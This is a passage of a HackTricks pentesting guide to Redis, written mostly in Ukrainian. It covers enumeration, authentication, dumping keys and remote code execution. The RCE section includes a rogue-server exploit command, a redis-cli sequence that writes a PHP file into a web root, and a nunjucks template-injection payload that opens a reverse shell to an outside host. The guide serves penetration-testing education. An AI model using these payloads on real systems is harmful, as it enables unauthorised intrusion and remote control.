# 6379 - Pentesting Redis

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

–ó [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó](https://redis.io/topics/introduction): Redis - —Ü–µ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π –∫–æ–¥ (–ª—ñ—Ü–µ–Ω–∑—ñ—è BSD), —Å—Ö–æ–≤–∏—â–µ **—Å—Ç—Ä—É–∫—Ç—É—Ä –¥–∞–Ω–∏—Ö** –≤ –ø–∞–º'—è—Ç—ñ, —è–∫–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —è–∫ **–±–∞–∑–∞ –¥–∞–Ω–∏—Ö**, –∫–µ—à —ñ –±—Ä–æ–∫–µ—Ä –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å.

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º Redis –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–æ—Ç–æ–∫–æ–ª –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø—Ä–æ—Å—Ç–æ–≥–æ —Ç–µ–∫—Å—Ç—É, –∞–ª–µ –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –ø–∞–º'—è—Ç–∞—Ç–∏, —â–æ –≤—ñ–Ω —Ç–∞–∫–æ–∂ –º–æ–∂–µ —Ä–µ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ **ssl/tls**. –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è, —è–∫ [–∑–∞–ø—É—Å—Ç–∏—Ç–∏ Redis –∑ ssl/tls —Ç—É—Ç](https://fossies.org/linux/redis/TLS.md).

**–ü–æ—Ä—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º:** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è

–î–µ—è–∫—ñ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –¥–æ–ø–æ–º–æ–≥—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –∑ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ redis:
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## Manual Enumeration

### Banner

Redis —î **—Ç–µ–∫—Å—Ç–æ–≤–∏–º –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–º**, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ **–Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É –≤ —Å–æ–∫–µ—Ç** —ñ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ –∑–Ω–∞—á–µ–Ω–Ω—è –±—É–¥—É—Ç—å —á–∏—Ç–∞–±–µ–ª—å–Ω–∏–º–∏. –¢–∞–∫–æ–∂ –ø–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ Redis –º–æ–∂–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º **ssl/tls** (–∞–ª–µ —Ü–µ –¥—É–∂–µ –¥–∏–≤–Ω–æ).

–£ –∑–≤–∏—á–∞–π–Ω–æ–º—É –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ Redis –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `nc` –∞–±–æ –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `redis-cli`:
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
–ü–µ—Ä—à–æ—é –∫–æ–º–∞–Ω–¥–æ—é, —è–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏, —î **`info`**. –í–æ–Ω–∞ **–º–æ–∂–µ –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ –≤–∏—Ö—ñ–¥ –∑ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é** –ø—Ä–æ –µ–∫–∑–µ–º–ø–ª—è—Ä Redis **–∞–±–æ —â–æ—Å—å** –ø–æ–¥—ñ–±–Ω–µ –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ:
```
-NOAUTH Authentication required.
```
–£ —Ü—å–æ–º—É –æ—Å—Ç–∞–Ω–Ω—å–æ–º—É –≤–∏–ø–∞–¥–∫—É —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ **–≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ** –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ Redis.

### –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è Redis

**–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º** Redis –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø **–±–µ–∑ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö**. –û–¥–Ω–∞–∫ –π–æ–≥–æ –º–æ–∂–Ω–∞ **–Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏** –Ω–∞ –ø—ñ–¥—Ç—Ä–∏–º–∫—É **—Ç—ñ–ª—å–∫–∏ –ø–∞—Ä–æ–ª—è –∞–±–æ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ + –ø–∞—Ä–æ–ª—è**.\
–ú–æ–∂–Ω–∞ **–≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –ø–∞—Ä–æ–ª—å** —É —Ñ–∞–π–ª—ñ _**redis.conf**_ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `requirepass` **–∞–±–æ —Ç–∏–º—á–∞—Å–æ–≤–æ** –¥–æ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫—É —Å–ª—É–∂–±–∏, –ø—ñ–¥–∫–ª—é—á–∏–≤—à–∏—Å—å –¥–æ –Ω–µ—ó —Ç–∞ –≤–∏–∫–æ–Ω–∞–≤—à–∏: `config set requirepass p@ss$12E45`.\
–¢–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ **—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ `masteruser` –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É _**redis.conf**_.

{% hint style="info" %}
–Ø–∫—â–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ –ª–∏—à–µ –ø–∞—Ä–æ–ª—å, —Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ "**default**".\
–¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–Ω–µ–º–∞—î —Å–ø–æ—Å–æ–±—É –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –∑–æ–≤–Ω—ñ**, —á–∏ –±—É–≤ Redis –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –ª–∏—à–µ –∑ –ø–∞—Ä–æ–ª–µ–º –∞–±–æ –∑ —ñ–º'—è–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ + –ø–∞—Ä–æ–ª–µ–º.
{% endhint %}

–£ —Ç–∞–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –≤–∞–º **–ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞–π—Ç–∏ –¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ** –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ Redis, —Ç–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ [**brute-force**](../generic-methodologies-and-resources/brute-force.md#redis).\
**–£ —Ä–∞–∑—ñ, —è–∫—â–æ –≤–∏ –∑–Ω–∞–π—à–ª–∏ –¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ —Å–µ—Å—ñ—é** –ø—ñ—Å–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∑'—î–¥–Ω–∞–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–∏:
```bash
AUTH <username> <password>
```
**–î—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ** –±—É–¥—É—Ç—å –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω—ñ: `+OK`

### **–ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∞ –µ–Ω—É–º–µ—Ä–∞—Ü—ñ—è**

–Ø–∫—â–æ —Å–µ—Ä–≤–µ—Ä Redis –¥–æ–∑–≤–æ–ª—è—î **–∞–Ω–æ–Ω—ñ–º–Ω—ñ –∑'—î–¥–Ω–∞–Ω–Ω—è** –∞–±–æ —è–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ –¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–∑–ø–æ—á–∞—Ç–∏ –ø—Ä–æ—Ü–µ—Å –µ–Ω—É–º–µ—Ä–∞—Ü—ñ—ó –¥–ª—è —Å–ª—É–∂–±–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ **–∫–æ–º–∞–Ω–¥–∏**:
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**–Ü–Ω—à—ñ –∫–æ–º–∞–Ω–¥–∏ Redis** [**–º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —Ç—É—Ç**](https://redis.io/topics/data-types-intro) **—ñ** [**—Ç—É—Ç**](https://lzone.de/cheat-sheet/Redis)**.**

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–∫–æ–º–∞–Ω–¥–∏ Redis –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø–µ—Ä–µ–π–º–µ–Ω–æ–≤–∞–Ω—ñ** –∞–±–æ –≤–∏–¥–∞–ª–µ–Ω—ñ —É —Ñ–∞–π–ª—ñ _redis.conf_. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —Ü–µ–π —Ä—è–¥–æ–∫ –≤–∏–¥–∞–ª–∏—Ç—å –∫–æ–º–∞–Ω–¥—É FLUSHDB:
```
rename-command FLUSHDB ""
```
–ë—ñ–ª—å—à–µ –ø—Ä–æ –±–µ–∑–ø–µ—á–Ω—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —Å–ª—É–∂–±–∏ Redis —Ç—É—Ç: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ **–º–æ–Ω—ñ—Ç–æ—Ä–∏—Ç–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ –∫–æ–º–∞–Ω–¥–∏ Redis**, –≤–∏–∫–æ–Ω–∞–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–∏ **`monitor`**, –∞–±–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ç–æ–ø **25 –Ω–∞–π–ø–æ–≤—ñ–ª—å–Ω—ñ—à–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`slowlog get 25`**

–ó–Ω–∞–π–¥—ñ—Ç—å –±—ñ–ª—å—à–µ —Ü—ñ–∫–∞–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —ñ–Ω—à—ñ –∫–æ–º–∞–Ω–¥–∏ Redis —Ç—É—Ç: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **–í–∏–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö**

–£ Redis **–±–∞–∑–∏ –¥–∞–Ω–∏—Ö - —Ü–µ —á–∏—Å–ª–∞, —â–æ –ø–æ—á–∏–Ω–∞—é—Ç—å—Å—è –∑ 0**. –í–∏ –º–æ–∂–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —á–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —è–∫–∞—Å—å –∑ –Ω–∏—Ö, —É –≤–∏—Ö–æ–¥—ñ –∫–æ–º–∞–Ω–¥–∏ `info` —É —á–∞—Å—Ç–∏–Ω—ñ "Keyspace":

![](<../.gitbook/assets/image (766).png>)

–ê–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤—Å—ñ **keyspaces** (–±–∞–∑–∏ –¥–∞–Ω–∏—Ö) –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```
INFO keyspace
```
–£ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è **–±–∞–∑–∏ –¥–∞–Ω–∏—Ö 0 —Ç–∞ 1**. **–ë–∞–∑–∞ –¥–∞–Ω–∏—Ö 0 –º—ñ—Å—Ç–∏—Ç—å 4 –∫–ª—é—á—ñ, –∞ –±–∞–∑–∞ –¥–∞–Ω–∏—Ö 1 –º—ñ—Å—Ç–∏—Ç—å 1**. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º Redis –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ –±–∞–∑—É –¥–∞–Ω–∏—Ö 0. –©–æ–±, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Å–∫–∏–Ω—É—Ç–∏ –±–∞–∑—É –¥–∞–Ω–∏—Ö 1, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑—Ä–æ–±–∏—Ç–∏:
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
–£ –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É –ø–æ–º–∏–ª–∫—É `-WRONGTYPE Operation against a key holding the wrong kind of value` –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è `GET <KEY>`, —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ —á–µ—Ä–µ–∑ —Ç–µ, —â–æ –∫–ª—é—á –º–æ–∂–µ –±—É—Ç–∏ —á–∏–º–æ—Å—å —ñ–Ω—à–∏–º, –Ω—ñ–∂ —Ä—è–¥–æ–∫ –∞–±–æ —Ü—ñ–ª–µ —á–∏—Å–ª–æ, —ñ –≤–∏–º–∞–≥–∞—î —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ–≥–æ –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞ –¥–ª—è –π–æ–≥–æ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è.

–©–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è —Ç–∏–ø –∫–ª—é—á–∞, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É `TYPE`, –ø—Ä–∏–∫–ª–∞–¥ –Ω–∏–∂—á–µ –¥–ª—è —Å–ø–∏—Å–∫–æ–≤–∏—Ö —Ç–∞ —Ö–µ—à-–∫–ª—é—á—ñ–≤.
```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```
**–í–∏–≤–∞–Ω—Ç–∞–∂—Ç–µ –±–∞–∑—É –¥–∞–Ω–∏—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é npm**[ **redis-dump**](https://www.npmjs.com/package/redis-dump) **–∞–±–æ python** [**redis-utils**](https://pypi.org/project/redis-utils/)

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) —Å–µ—Ä–≤–µ—Ä–∞, —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ —à—É–∫–∞—á–∞–º–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π!

**–Ü–Ω—Å–∞–π—Ç–∏ –∑ —Ö–∞–∫—ñ–Ω–≥—É**\
–ó–∞–ª—É—á–∞–π—Ç–µ—Å—è –¥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É, —è–∫–∏–π –∑–∞–Ω—É—Ä—é—î—Ç—å—Å—è —É –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫—ñ–Ω–≥—É

**–ù–æ–≤–∏–Ω–∏ –ø—Ä–æ —Ö–∞–∫—ñ–Ω–≥ —É —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ**\
–°–ª—ñ–¥–∫—É–π—Ç–µ –∑–∞ —à–≤–∏–¥–∫–æ–ø–ª–∏–Ω–Ω–∏–º —Å–≤—ñ—Ç–æ–º —Ö–∞–∫—ñ–Ω–≥—É —á–µ—Ä–µ–∑ –Ω–æ–≤–∏–Ω–∏ —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –Ω–æ–≤–∏—Ö –ø—Ä–æ–≥—Ä–∞–º –≤–∏–Ω–∞–≥–æ—Ä–æ–¥ –∑–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º

**–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞** [**Discord**](https://discord.com/invite/N3FrSbmwdy) —ñ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –ø—Ä–æ–≤—ñ–¥–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

## Redis RCE

### –Ü–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–∞ –æ–±–æ–ª–æ–Ω–∫–∞

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) –º–æ–∂–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—É –æ–±–æ–ª–æ–Ω–∫—É –∞–±–æ –∑–≤–æ—Ä–æ—Ç–Ω—É –æ–±–æ–ª–æ–Ω–∫—É –≤ Redis(<=5.0.5).
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP Webshell

–Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –∑ [**—Ç—É—Ç**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html). –í–∏ –ø–æ–≤–∏–Ω–Ω—ñ –∑–Ω–∞—Ç–∏ **—à–ª—è—Ö** –¥–æ **–ø–∞–ø–∫–∏ –≤–µ–±-—Å–∞–π—Ç—É**:
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
‚Äã–Ø–∫—â–æ –≤–∏–Ω–∏–∫–∞—î –≤–∏–Ω—è—Ç–æ–∫ –¥–æ—Å—Ç—É–ø—É –¥–æ –≤–µ–±-–æ–±–æ–ª–æ–Ω–∫–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—á–∏—Å—Ç–∏—Ç–∏ –±–∞–∑—É –¥–∞–Ω–∏—Ö –ø—ñ—Å–ª—è —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ –∫–æ–ø—ñ—é–≤–∞–Ω–Ω—è —ñ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–Ω–æ–≤—É, –Ω–µ –∑–∞–±—É–≤–∞–π—Ç–µ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ –±–∞–∑—É –¥–∞–Ω–∏—Ö.

### –®–∞–±–ª–æ–Ω –≤–µ–±-–æ–±–æ–ª–æ–Ω–∫–∏

–Ø–∫ —ñ –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –¥–µ—è–∫–∏–π html —à–∞–±–ª–æ–Ω–Ω–∏–π —Ñ–∞–π–ª, —è–∫–∏–π –±—É–¥–µ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–æ–≤–∞–Ω–æ —à–∞–±–ª–æ–Ω–Ω–∏–º –¥–≤–∏–≥—É–Ω–æ–º, —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ –æ–±–æ–ª–æ–Ω–∫—É.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —Å–ª—ñ–¥—É—é—á–∏ [**—Ü—å–æ–º—É –æ–ø–∏—Å—É**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/), –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤—Å—Ç–∞–≤–∏–≤ **rev shell –≤ html**, —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–æ–≤–∞–Ω–∏–π **–¥–≤–∏–≥—É–Ω–æ–º —à–∞–±–ª–æ–Ω—ñ–≤ nunjucks:**
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
{% hint style="warning" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–¥–µ–∫—ñ–ª—å–∫–∞ —à–∞–±–ª–æ–Ω–Ω–∏—Ö –¥–≤–∏–∂–∫—ñ–≤ –∫–µ—à—É—é—Ç—å** —à–∞–±–ª–æ–Ω–∏ –≤ **–ø–∞–º'—è—Ç—ñ**, —Ç–æ–º—É –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ —ó—Ö –ø–µ—Ä–µ–∑–∞–ø–∏—à–µ—Ç–µ, –Ω–æ–≤–∏–π **–Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–∏–π**. –£ —Ç–∞–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –∞–±–æ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫ –∑–∞–ª–∏—à–∏–≤ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∞–∫—Ç–∏–≤–Ω–∏–º, –∞–±–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑—Ä–æ–±–∏—Ç–∏ DoS –Ω–∞–¥ —Å–µ—Ä–≤—ñ—Å–æ–º (—ñ —Å–ø–æ–¥—ñ–≤–∞—Ç–∏—Å—è, —â–æ –≤—ñ–Ω –±—É–¥–µ –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω–∏–π –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ).
{% endhint %}

### SSH

–ü—Ä–∏–∫–ª–∞–¥ [–∑–≤—ñ–¥—Å–∏](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

